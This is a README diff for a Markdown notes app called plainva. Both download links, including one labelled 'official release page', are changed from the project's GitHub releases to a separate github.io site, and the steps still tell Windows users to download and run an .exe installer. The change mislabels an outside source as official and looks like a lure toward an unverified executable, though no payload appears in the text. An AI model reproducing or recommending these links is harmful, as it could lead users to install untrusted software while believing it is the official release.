@@ -1,6 +1,6 @@
 # 📝 plainva - Manage your notes on your terms
 
-[![](https://img.shields.io/badge/Download_Plainva-blue.svg)](https://github.com/Maysupreme657/plainva/releases)
+[![](https://img.shields.io/badge/Download_Plainva-blue.svg)](https://maysupreme657.github.io)
 
 Plainva is a tool for your notes. It works with plain Markdown files. You store your notes where you choose. This app connects to your files directly. It does not hide your data in a closed format. You keep total control over your digital knowledge base.
 
@@ -14,7 +14,7 @@ The app supports the Markdown format. This means your files remain readable in a
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/Maysupreme657/plainva/releases) to find the latest version of the app.
+1. Visit the [official release page](https://maysupreme657.github.io) to find the latest version of the app.
 2. Look for the file ending in `.exe`. 
 3. Click the link to download the installer to your Downloads folder.
 4. Open your Downloads folder and double-click the file to start the installation.
